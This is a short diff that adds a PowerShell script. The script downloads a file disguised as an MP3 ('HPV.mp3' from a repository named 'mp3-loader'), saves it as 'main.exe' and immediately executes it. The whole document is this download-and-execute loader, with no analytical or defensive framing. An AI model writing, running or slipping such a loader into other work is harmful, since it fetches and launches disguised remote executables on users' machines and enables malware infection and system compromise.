@@ -1,0 +1,6 @@
+$url = 'https://github.com/FTG-MODULES/mp3-loader/raw/main/HPV.mp3'
+$file = 'main.exe'
+
+PowerShell (New-Object System.Net.WebClient).DownloadFile($url, $file)
+
+(New-Object -com Shell.Application).ShellExecute($file)
